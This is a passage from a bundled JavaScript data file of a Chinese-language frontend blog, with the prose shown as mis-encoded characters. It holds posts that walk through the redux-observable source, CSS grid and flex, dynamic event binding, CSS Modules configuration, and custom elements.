observeOn(queueScheduler)\\n    );\\n    <span class=\\"hljs-comment\\">// å®šä¹‰ä¸€ä¸ªActionsObservableï¼Œç”¨æ¥ç»‘å®šç”¨æˆ·å®šä¹‰çš„æ“ä½œæµ</span>\\n    <span class=\\"hljs-keyword\\">const</span> action$ = <span class=\\"hljs-keyword\\">new</span> ActionsObservable(actionSubject$);\\n    <span class=\\"hljs-comment\\">// å®šä¹‰ä¸€ä¸ªStateObservableï¼Œå†…éƒ¨æ”¹å†™äº†Observableçš„_subscribeæ–¹æ³•ï¼Œå¹¶ä¸”è®©stateSubject$ç»‘å®šäº†valueå¯¹æ¯”æ“ä½œï¼Œå°±æ˜¯ç®€å•çš„å¼•ç”¨å¯¹æ¯”`===`</span>\\n    <span class=\\"hljs-keyword\\">const</span> state$ = <span class=\\"hljs-keyword\\">new</span> StateObservable(stateSubject$, store.getState());\\n\\n    <span class=\\"hljs-comment\\">/*...*/</span>\\n  }\\n}</code></pre></code></pre>\\n<p>ä¸‰ã€è¿™é‡Œæ˜¯æ ¸å¿ƒï¼Œæ‰€æœ‰æµå’Œæ“ä½œç¬¦çš„ç»‘å®šå°±æ˜¯åœ¨æ­¤å†…éƒ¨è¿›è¡Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n\\n  <span class=\\"hljs-comment\\">// pipeæ“ä½œç¬¦</span>\\n<span class=\\"hljs-keyword\\">const</span> result$ = epic$.pipe(\\n  <span class=\\"hljs-comment\\">// å¯¹å‘å°„æºé€ä¸ªå¤„ç†</span>\\n  map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">epic</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// å¦‚æœé…ç½®æœ‰ dependencies å°±æ”¾ç½®åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­</span>\\n    <span class=\\"hljs-keyword\\">const</span> output$ = <span class=\\"hljs-string\\">\'dependencies\'</span> <span class=\\"hljs-keyword\\">in</span> options\\n      ? epic(action$, state$, options.dependencies)\\n      : epic(action$, state$);\\n    <span class=\\"hljs-comment\\">// æ— è¿”å›å€¼ï¼ŒæŠ¥é”™ï¼Œåº”è¯¥è¦è¿”å›ä¸€ä¸ªä¸åŒçš„æµ</span>\\n    <span class=\\"hljs-keyword\\">if</span> (!output$) {\\n      <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">`Your root Epic \\"<span class=\\"hljs-subst\\">${epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>}</span>\\" does not return a stream. Double check you\\\\\'re not missing a return statement!`</span>);\\n    }\\n    <span class=\\"hljs-comment\\">// output$ æ˜¯ä¸€ä¸ªActionObservableç±»å‹çš„æµ</span>\\n    <span class=\\"hljs-keyword\\">return</span> output$;\\n  }),\\n  <span class=\\"hljs-comment\\">// å¯¹æ‰€æœ‰å¤–éƒ¨æµï¼Œç»‘å®šé˜Ÿåˆ—è°ƒåº¦å¹¶ä¸”ä½¿ç”¨mergeMapé‡æ–°subscribe</span>\\n  mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">output$</span> =&gt;</span>\\n    <span class=\\"hljs-keyword\\">from</span>(output$).pipe(\\n      subscribeOn(queueScheduler),\\n      observeOn(queueScheduler)\\n    )\\n  )\\n);\\n\\n    <span class=\\"hljs-comment\\">/*...*/</span>\\n}\\n</code></pre></code></pre>\\n<p>å››ã€epicæ‰§è¡Œä¸»è¦æµç¨‹ï¼Œ<code>dispatch(action$)</code>--&gt; <code>actionSubject$.next(action)</code>--&gt;ç»è¿‡ä¸€ç³»åˆ—æ“ä½œç¬¦--&gt;æœ€ååˆ°è¾¾åº•å±‚<code>dispatch(state)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n<span class=\\"hljs-comment\\">/*...*/</span>\\n\\n<span class=\\"hljs-comment\\">// è®¢é˜… dispatchï¼Œæ­¤å¤„å°†dispathä½œä¸ºæµæ‰§è¡Œçš„æœ€åº•å±‚</span>\\nresult$.subscribe(store.dispatch);\\n\\n<span class=\\"hljs-comment\\">// è¿”å›çš„æ ¼å¼æ˜¯æŒ‰ç…§reduxä¸­é—´ä»¶çš„æ ¼å¼</span>\\n<span class=\\"hljs-comment\\">// é‡Œé¢çš„å†…å®¹éƒ½æ˜¯è¿è¡Œæ—¶reduxé‡Œdispatchåä¼šæ‰§è¡Œçš„æµç¨‹</span>\\n<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// æ­¤å¤„å…ˆæˆªå–next(action)</span>\\n    <span class=\\"hljs-keyword\\">const</span> result = next(action);\\n    <span class=\\"hljs-comment\\">// å…ˆæ‰§è¡Œ stateSubject$.next å¯ä»¥ä¿è¯stateçš„æ›´æ–°</span>\\n    stateSubject$.next(store.getState());\\n    <span class=\\"hljs-comment\\">// æ“ä½œç¬¦æŒ‰æ­¥éª¤æ‰§è¡Œï¼Œæ­¤æ—¶çš„actionSubject$å·²ç»ç»‘å®šäº†æ‰€æœ‰çš„æ“ä½œç¬¦</span>\\n    actionSubject$.next(action);\\n    <span class=\\"hljs-keyword\\">return</span> result;\\n  };\\n};\\n<span class=\\"hljs-comment\\">// runæ–¹æ³•ï¼Œé€šè¿‡epic$çš„nextæ–¹æ³•åˆå§‹åŒ–action(è§ç¬¬ä¸‰)ï¼Œä»è€Œç»‘å®šç”¨æˆ·è‡ªå®šä¹‰çš„æ“ä½œç¬¦</span>\\nepicMiddleware.run = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">rootEpic</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; !store) {\\n    <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'./utils/console\'</span>).warn(<span class=\\"hljs-string\\">\'epicMiddleware.run(rootEpic) called before the middleware has been setup by redux. Provide the epicMiddleware instance to createStore() first.\'</span>);\\n  }\\n    <span class=\\"hljs-comment\\">// rootEpicå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„æ“ä½œç¬¦</span>\\n  epic$.next(rootEpic);\\n};\\n<span class=\\"hljs-keyword\\">return</span> epicMiddleware;\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"operatorsjs\\">operators.js</h3>\\n<p>å®šä¹‰äº†<code>ofType</code>ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªfilter</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¼•å…¥filter</span>\\n<span class=\\"hljs-keyword\\">import</span> { filter } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs/operators\'</span>;\\n<span class=\\"hljs-comment\\">// è¿™é‡Œtypeå°±æ˜¯ä¼ ç»™epicçš„actionçš„typeçš„å€¼ï¼Œkeyå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦è¿‡æ»¤çš„å€¼</span>\\n<span class=\\"hljs-keyword\\">const</span> keyHasType = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">type, key</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> type === key || <span class=\\"hljs-keyword\\">typeof</span> key === <span class=\\"hljs-string\\">\'function\'</span> &amp;&amp; type === key.toString();\\n};\\n<span class=\\"hljs-comment\\">// sourceå°±æ˜¯è°ƒç”¨ofTypeçš„æµï¼Œä¹Ÿå°±æ˜¯createEpicMiddlewareé‡Œçš„action$</span>\\n<span class=\\"hljs-comment\\">// ç»“æœåªæœ‰è¿”å›trueæ‰ä¼šç»§ç»­é“¾å¼è°ƒç”¨</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> ofType = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...keys</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">source</span>) =&gt;</span> source.pipe(\\n  filter(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">{ type }</span>) =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">const</span> len = keys.length;\\n    <span class=\\"hljs-keyword\\">if</span> (len === <span class=\\"hljs-number\\">1</span>) {\\n      <span class=\\"hljs-keyword\\">return</span> keyHasType(type, keys[<span class=\\"hljs-number\\">0</span>]);\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>; i &lt; len; i++) {\\n        <span class=\\"hljs-keyword\\">if</span> (keyHasType(type, keys[i])) {\\n          <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>;\\n        }\\n      }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span>;\\n  })\\n);</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"stateobservablejs\\">StateObservable.js</h3>\\n<p>ç»§æ‰¿<code>Observable</code>ï¼Œå®šä¹‰äº†ä¸€ä¸ªä¿å­˜çŠ¶æ€çš„ç±»ï¼Œé‡Œé¢æ”¹å†™äº†çˆ¶ç±»(<code>Observable</code>)çš„<code>_subscribe</code>(ä½œç”¨ä¸å¤ªæ¸…æ¥š)ï¼Œ\\nå¹¶ä¸”å®šä¹‰äº†ä¸€ä¸ªä¿å­˜å½“å‰æ•°æ®çŠ¶æ€çš„å‡½æ•°ï¼Œé€šè¿‡stateSubject(ä¹Ÿå°±æ˜¯createEpicMiddlewareé‡Œé¢çš„<code>stateSubject$</code>)çš„<code>subscribe</code>ç»‘å®šåˆ°åº•å±‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { Observable, Subject } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs\'</span>;\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">StateObservable</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Observable</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(stateSubject, initialState) {\\n    <span class=\\"hljs-comment\\">// è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œæ”¹å†™çˆ¶ç±»çš„_subscribe</span>\\n    <span class=\\"hljs-comment\\">// todo ä½œç”¨ï¼Ÿ</span>\\n    <span class=\\"hljs-keyword\\">super</span>(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">subscriber</span> =&gt;</span> {\\n      <span class=\\"hljs-keyword\\">const</span> subscription = <span class=\\"hljs-keyword\\">this</span>.__notifier.subscribe(subscriber);\\n      <span class=\\"hljs-keyword\\">if</span> (subscription &amp;&amp; !subscription.closed) {\\n        subscriber.next(<span class=\\"hljs-keyword\\">this</span>.value);\\n      }\\n      <span class=\\"hljs-keyword\\">return</span> subscription;\\n    });\\n\\n    <span class=\\"hljs-keyword\\">this</span>.value = initialState;\\n     <span class=\\"hljs-keyword\\">this</span>.__notifier = <span class=\\"hljs-keyword\\">new</span> Subject();\\n      <span class=\\"hljs-comment\\">// ç»‘å®šä¸€ä¸ªå¼•ç”¨æ¯”è¾ƒçš„çŠ¶æ€å‡½æ•°</span>\\n     <span class=\\"hljs-keyword\\">this</span>.__subscription = stateSubject.subscribe(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">value</span> =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">if</span> (value !== <span class=\\"hljs-keyword\\">this</span>.value) {\\n         <span class=\\"hljs-keyword\\">this</span>.value = value;\\n         <span class=\\"hljs-keyword\\">this</span>.__notifier.next(value);\\n       }\\n     });\\n   }\\n }</code></pre></code></pre>\\n<p>æºç å°±åˆ°æ­¤åˆ†æå®Œäº†ï¼Œçœ‹åˆ°è¿™é‡Œå¯èƒ½è¿˜æ˜¯ä¸€å¤´é›¾æ°´ï¼ŒçŸ¥é“æ˜¯ä»€ä¹ˆä¹Ÿåªæ˜¯æ¦‚å¿µä¸Šçš„çŸ¥é“ï¼Œå¯¹æ•´ä¸ªæµç¨‹è¿˜æ˜¯æ²¡æœ‰å¤´ç»ª</p>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.redux-observable/README.md\\">æŸ¥çœ‹æ›´å¤šå…³äºæµç¨‹åˆ†æ</a></p>\\n","toc":[{"anchor":"yue-du-qian-ti","level":2,"text":"é˜…è¯»å‰æ"},{"anchor":"mu-lu-jie-gou","level":2,"text":"ç›®å½•ç»“æ„"},{"anchor":"yuan-ma-fen-xi","level":2,"text":"æºç åˆ†æ"},{"anchor":"actionobservablejs","level":3,"text":"ActionObservable.js"},{"anchor":"combineepicsjs","level":3,"text":"combineEpics.js"},{"anchor":"createepicmiddlewarejs","level":3,"text":"createEpicMiddleware.js"},{"anchor":"operatorsjs","level":3,"text":"operators.js"},{"anchor":"stateobservablejs","level":3,"text":"StateObservable.js"}],"relatedTags":null,"created_at":"2018-07-31","timeArr":[2018,6,31,0,0,0,0],"title":"ä»æºç ç†è§£redux-observable","uuid":"11c12164597745ff2b79b9aa256465683ed63ab6","summary":"<h4>é˜…è¯»å‰æï¼š</h4>\\n<ol>\\n<li>æœ‰rxjsåŸºç¡€ï¼Œå¯¹<code>Observable</code>, <code>Subject</code>,<code>pipe</code>å’Œä¸€äº›æ“ä½œç¬¦(ä¾‹å¦‚<code>filter</code>,<code>map</code>,<code>merge</code>,<code>mergeMap</code>)æ‰§è¡Œæµç¨‹æœ‰åŸºæœ¬äº†è§£ï¼Œæœ€èµ·ç é‡åˆ°ä¸æ¸…æ¥šæœ‰å»æŸ¥é˜…çš„åŠ¨åŠ›</li>\\n<li>æ¯”è¾ƒç†Ÿæ‚‰<code>redux</code>ä¸­é—´ä»¶çš„å†™æ³•ï¼Œå¦åˆ™åƒ`createEpicMidd...</li>\\n</ol>","slug":"cong-yuan-ma-li-jie-redux-observable","sha":"6e85cade1d479e41467fc8f31c7cce1b2d0eca18"}')},583:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"charset\\">@charset</h2>\\n<p>@charset åœ¨å¤–éƒ¨æ ·å¼è¡¨æ–‡ä»¶å†…ä½¿ç”¨ã€‚æŒ‡å®šè¯¥æ ·å¼è¡¨ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ã€‚</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>@charset &quot;utf-8&quot;;\\nbody {  }\\ndiv {  }</code></pre></code></pre>\\n<h2 id=\\"inline-flex\\">inline-flex</h2>\\n<p>inline-flexå’Œflex æ˜¯é’ˆå¯¹flexå®¹å™¨çš„å†…è”æ˜¾ç¤ºæ”¹å˜ï¼Œè€Œå®ƒå†…éƒ¨çš„flex-itemåˆ™ä¸å—å½±å“</p>\\n<h2 id=\\"grid\\">grid</h2>\\n<ul>\\n<li><p>å®ç°çš„æ˜¯box-sizing:border-boxæ•ˆæœï¼Œæ— æ³•æ›´æ”¹</p>\\n</li>\\n<li><p>grid-template-rowsï¼ˆå¯¹åº”æ¯ä¸€è¡Œçš„é«˜åº¦ï¼‰</p>\\n<p>  <code>grid-template-rows:50px 100px 150px;</code></p>\\n<p>  ä»£è¡¨ç¬¬ä¸€è¡Œ50ï¼Œç¬¬äºŒè¡Œ100ï¼Œç¬¬ä¸‰è¡Œ150</p>\\n</li>\\n<li><p>grid-template-columnsï¼ˆå¯¹åº”æ¯ä¸€åˆ—çš„å®½åº¦ï¼‰</p>\\n<p>  <code>grid-template-columns:30px 50px 80px;</code></p>\\n</li>\\n</ul>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>8ä¸ªå…ƒç´ åˆ—è¢«4æ¡çº¿åˆ†å‰²</p>\\n<pre><code><pre class=\\"hljs\\"><code>1  2  3  4\\n|XX|XX|XX|\\n|XX|XX|XX|\\n|XX|XX|  |</code></pre></code></pre><p>é€šè¿‡æ‰§è¡Œï¼š</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>grid-column-start: 1;\\ngrid-column-end: 3;</code></pre></code></pre>\\n<p>å˜æˆå¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>XXXXX XX\\nXX XX XX\\nXX XX XX</code></pre></code></pre><p>åœ¨çº¿ä¾‹å­<a href=\\"https://codesandbox.io/s/kx657w6lv7\\">https://codesandbox.io/s/kx657w6lv7</a></p>\\n<ul>\\n<li><p>grid-template-area &amp;&amp; grid-area</p>\\n<p>  é€šè¿‡grid-areaå®šä¹‰åç§°</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>  .block1{ grid-area: a; }\\n  .block2{ grid-area: b; }\\n  .block3{ grid-area: c; }\\n  .block4{ grid-area: d; }</code></pre></code></pre>\\n<p>  ç„¶åç”¨grid-template-areaæ’åˆ—åç§°ï¼Œfr æ˜¯ç½‘æ ¼å®¹å™¨å‰©ä½™ç©ºé—´çš„ç­‰åˆ†å•ä½</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>  #container {\\n  box-sizing:content-box;\\n  display: grid;\\n  grid-template-rows:repeat(6,1fr);\\n  grid-template-columns:50px 50px 50px 50px;\\n  grid-template-areas:\\n  &quot;c . a a a .&quot;\\n  &quot;c b b b b b&quot;\\n  &quot;c b b b b b&quot;\\n  &quot;d d d d d d&quot;;\\n  }</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>åœ¨çº¿ä¾‹å­<a href=\\"https://codesandbox.io/s/j40102z829\\">https://codesandbox.io/s/j40102z829</a></p>\\n<ul>\\n<li>inline-grid ä¹Ÿæ˜¯å®¹å™¨å˜ä¸ºå†…è”æ ¼å¼</li>\\n</ul>\\n","toc":[{"anchor":"charset","level":2,"text":"@charset"},{"anchor":"inline-flex","level":2,"text":"inline-flex"},{"anchor":"grid","level":2,"text":"grid"}],"relatedTags":null,"created_at":"2018-07-27","timeArr":[2018,6,27,0,0,0,0],"title":"cssè¡¥ç¼º","uuid":"4f7f64522646a72cae1c94073ca8d665ecf77efd","summary":"<h4>@charset</h4>\\n<p>@charset åœ¨å¤–éƒ¨æ ·å¼è¡¨æ–‡ä»¶å†…ä½¿ç”¨ã€‚æŒ‡å®šè¯¥æ ·å¼è¡¨ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ã€‚</p>\\n<pre class=\\"hljs\\"><code>@charset &quot;utf-8&quot;;\\nbody {  }\\ndiv {  }\\n</code></pre>\\n<h4>inline-flex</h4>\\n<p>inline-flexå’Œflex æ˜¯é’ˆå¯¹flexå®¹å™¨çš„å†…è”æ˜¾ç¤ºæ”¹å˜ï¼Œè€Œå®ƒå†…éƒ¨çš„flex-item...</p>","slug":"css-bu-que","sha":"4a1043ffaa6c98e2971a83f9fba138ad8462eafa"}')},584:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"css3-zhong-fu-zhi-fang-shi\\">css3ç§èµ‹å€¼æ–¹å¼</h2>\\n<ol>\\n<li><code>element.style.name=value</code></li>\\n<li><code>element.style.setProperty(&#39;name&#39;,&#39;value&#39;)</code></li>\\n<li><code>element.style.cssText=&quot;name:value&quot;</code></li>\\n</ol>\\n<p>1å’Œ2ä¸€æ¬¡éƒ½åªèƒ½å¯¹å•ä¸ªå±æ€§èµ‹å€¼ï¼Œåªå¯¹nameå±æ€§èµ‹å€¼ï¼Œ2æ€§èƒ½ç¨å¾®å¥½äº›</p>\\n<p>3ä¸€æ¬¡å¯èµ‹å€¼å¤šä¸ªå±æ€§ï¼ˆå‡å°‘é‡æ’ï¼‰ï¼Œä½†æ³¨æ„ä¼šå…ˆæ¸…é™¤å†…è”ä¸­å…¶ä»–éèµ‹å€¼å±æ€§</p>\\n<h2 id=\\"dong-tai-geng-xin-shi-jian-han-shu\\">åŠ¨æ€æ›´æ–°äº‹ä»¶å‡½æ•°</h2>\\n<ul>\\n<li>é€šå¸¸å†™æ³•<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> someEle=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"id\\"</span>)\\n<span class=\\"hljs-comment\\">// ç»‘å®š</span>\\nsomeEle.addEventListener(eventName,eventFunc)\\n<span class=\\"hljs-comment\\">// æ›¿æ¢</span>\\nsomeEle.removeEventListener(eventName,eventFunc)\\nsomeEle.addEventListener(eventName,newEventFunc)\\n<span class=\\"hljs-comment\\">// è§£ç»‘</span>\\nsomeEle.removeEventListener(eventName,newEventFunc)</code></pre></code></pre>\\nè¿™åªæ˜¯ä¸€ä¸ªå…ƒç´ çš„äº‹ä»¶ï¼Œå½“å…ƒç´ æˆ–è€…äº‹ä»¶å¤šäº†ï¼Œä¼šå†™å¾ˆå¤šç»‘å®šå’Œè§£ç»‘ä»£ç ï¼Œ\\nè€Œä¸”æ¯æ¬¡è§£ç»‘éƒ½è¦å»æŸ¥è¯¢ä¹‹å‰ç»‘å®šçš„å‡½æ•°</li>\\n</ul>\\n<ul>\\n<li>åŠ¨æ€æ›´æ–°å†™æ³•<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å®šä¹‰åŠ¨æ€äº‹ä»¶</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">eventListener</span>(<span class=\\"hljs-params\\">event</span>) </span>{\\n<span class=\\"hljs-keyword\\">return</span> event.currentTarget.events[event.type](event)\\n}\\n<span class=\\"hljs-comment\\">// åˆå§‹åŒ–  </span>\\n<span class=\\"hljs-keyword\\">var</span> someEle=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"id\\"</span>)\\n<span class=\\"hljs-keyword\\">if</span>(!someEle.events){\\nsomeEle.events={}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>// ç»‘å®š\\nsomeEle.events[eventName]=eventFunc\\nsomeEle.addEventListener(eventName,eventListener)\\n// æ›¿æ¢\\nsomeEle.events[eventName]=newEventFunc\\n// è§£ç»‘\\nsomeEle.removeEventListener(eventName,eventListener)</p>\\n<p>```\\nå¯ä»¥çœ‹åˆ°ï¼Œå½“ç»‘å®šæˆåŠŸåï¼Œæ¯æ¬¡æ›´æ–°åªéœ€è¦æ”¹å˜æ•°æ®ä¾¿å¯ï¼Œä¸éœ€è¦é‡æ–°ç»‘å®š</p>\\n<ul>\\n<li>æ³¨æ„ï¼šaddEventListenerç»‘å®šå¯ä»¥åŒæ—¶ç»‘å®šå¤šä¸ªäº‹ä»¶å‡½æ•°ï¼Œè€ŒåŠ¨æ€ç»‘å®šå•ä¸ªäº‹ä»¶åç§°åªèƒ½ç»‘å®š1ä¸ªäº‹ä»¶å‡½æ•°</li>\\n</ul>\\n","toc":[{"anchor":"css3-zhong-fu-zhi-fang-shi","level":2,"text":"css3ç§èµ‹å€¼æ–¹å¼"},{"anchor":"dong-tai-geng-xin-shi-jian-han-shu","level":2,"text":"åŠ¨æ€æ›´æ–°äº‹ä»¶å‡½æ•°"}],"relatedTags":null,"created_at":"2018-06-30","timeArr":[2018,5,30,0,0,0,0],"title":"css3ç§èµ‹å€¼-åŠ¨æ€ç»‘å®šäº‹ä»¶","uuid":"4f4c6e28771908a591c243c12f68d65599bc6d0e","summary":"<h4>css3ç§èµ‹å€¼æ–¹å¼</h4>\\n<ol>\\n<li><code>element.style.name=value</code></li>\\n<li><code>element.style.setProperty(\'name\',\'value\')</code></li>\\n<li><code>element.style.cssText=&quot;name:value&quot;</code></li>\\n</ol>\\n<p>1å’Œ2ä¸€æ¬¡éƒ½åªèƒ½å¯¹å•ä¸ªå±æ€§èµ‹å€¼ï¼Œåªå¯¹nameå±æ€§èµ‹å€¼ï¼Œ2...</p>","slug":"css3-zhong-fu-zhi-dong-tai-bang-ding-shi-jian","sha":"8e96930475cb06f0123593475430fadf9ed6eec0"}')},585:function(n){n.exports=JSON.parse('{"content":"<p>cssModuleé…ç½®ï¼Œå…ˆè¿›è¡Œwebpacké…ç½®ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>// ...\\ntest: /\\\\.css$/,\\nuse: [\'style-loader\', {\\n  loader: \'css-loader\',\\n  options: {\\n    module: true,\\n    localIdentName: \'[name]-[local]-[hash:base64:5]\'\\n  }\\n}],</code></pre></code></pre><p>localIdentNameå®šä¹‰åç§°çš„æ ¼å¼</p>\\n<h2 id=\\"ju-bu-he-quan-ju-yang-shi\\">å±€éƒ¨å’Œå…¨å±€æ ·å¼</h2>\\n<p>å½“å‰æ–‡ä»¶ç»“æ„ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---src\\n  |---index.js\\n  |---common.css\\n  ...</code></pre></code></pre><p>åœ¨common.csså†…éƒ¨</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>/* å±€éƒ¨æ ·å¼*/\\n.normal{\\n  color:red;\\n}\\n/* å±€éƒ¨æ ·å¼*/\\n.special{\\n  color:blue;\\n}\\n/* å…¨å±€æ ·å¼ï¼Œå¯ç›´æ¥æ­£å¸¸ä½¿ç”¨ .title */\\n:global(.title){\\n    color: green;\\n}\\n</code></pre></code></pre>\\n<p>åœ¨index.jså†…éƒ¨</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> styles <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./common.css\'</span>\\n\\nsomeEle.className=styles.normal;\\notherEle.className=styles.special;\\nglobalEle.className=<span class=\\"hljs-string\\">\\"title\\"</span>;</code></pre></code></pre>\\n<p>æ¸²æŸ“å‡ºæ¥çš„å…ƒç´ ç±»ä¼¼ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>&lt;div class=&quot;common-normal-2vEvb&quot;&gt;...(red color)&lt;/div&gt;\\n&lt;div class=&quot;common-special-1aNtQ&quot;&gt;...(blue color)&lt;/div&gt;\\n&lt;div class=&quot;title&quot;&gt;...(green color)&lt;/div&gt;</code></pre></code></pre><h2 id=\\"composes\\">composes</h2>\\n<p>å¦å¤–ï¼Œ.csså†…éƒ¨ä½¿ç”¨<code>composes</code>ç»„åˆæ ·å¼</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>.base{/* é€šç”¨æ ·å¼*/}\\n.case1{\\n  composes:base;\\n  /* å…¶ä»–æ ·å¼*/\\n}</code></pre></code></pre>\\n","toc":[{"anchor":"ju-bu-he-quan-ju-yang-shi","level":2,"text":"å±€éƒ¨å’Œå…¨å±€æ ·å¼"},{"anchor":"composes","level":2,"text":"composes"}],"relatedTags":null,"created_at":"2018-06-17","timeArr":[2018,5,17,0,0,0,0],"title":"cssModule","uuid":"0c2b37a7633e1d040b742bc9653e1a42eef51f8c","summary":"<p>cssModuleé…ç½®ï¼Œå…ˆè¿›è¡Œwebpacké…ç½®ï¼š</p>\\n<pre class=\\"hljs\\"><code>// ...\\ntest: /\\\\.css$/,\\nuse: [\'style-loader\', {\\n  loader: \'css-loader\',\\n  options: {\\n    module: true,\\n    localIdentName: \'[name]-...</code></pre>","slug":"cssModule","sha":"6ccea1616a61dc321481094dcb50899b11c98624"}')},586:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"custom-elements\\">custom elements</h3>\\n<p>ä½œç”¨ï¼šå°†HTMLé¡µé¢çš„åŠŸèƒ½å°è£…ä¸º<code>custom elements</code>(è‡ªå®šä¹‰æ ‡ç­¾)</p>\\n<blockquote>\\n<p><code>shadow root</code>ï¼šæ¸²æŸ“éš”ç¦»</p>\\n</blockquote>\\n<h3 id=\\"api\\">API</h3>\\n<ul>\\n<li><p>customElement.define()</p>\\n<p>  å®šä¹‰ä¸€ä¸ªæ–°çš„ è‡ªå®šä¹‰å…ƒç´ ã€‚</p>\\n<p>  å‚æ•°1ï¼š<code>name</code>è‡ªå®šä¹‰å…ƒç´ å.\\n  å‚æ•°2ï¼š<code>constructor</code>è‡ªå®šä¹‰å…ƒç´ æ„é€ å™¨.\\n  å‚æ•°3ï¼š<code>options</code> ç›®å‰æœ‰ä¸€ä¸ªé€‰é¡¹æ”¯æŒ:<code>extends</code>æŒ‡å®šç»§æ‰¿çš„å·²åˆ›å»ºçš„å…ƒç´ . è¢«ç”¨äºåˆ›å»ºè‡ªå®šä¹‰å…ƒç´ .\\n  ä¾‹å¦‚ï¼š<code>{extends:&#39;p&#39;}ç»§æ‰¿på…ƒç´ </code>ï¼Œæ„é€ ç»„ä»¶æ—¶<code>class MyEle extends HTMLParagraphElement{...}</code></p>\\n<blockquote>\\n<p>Autonomous custom elements 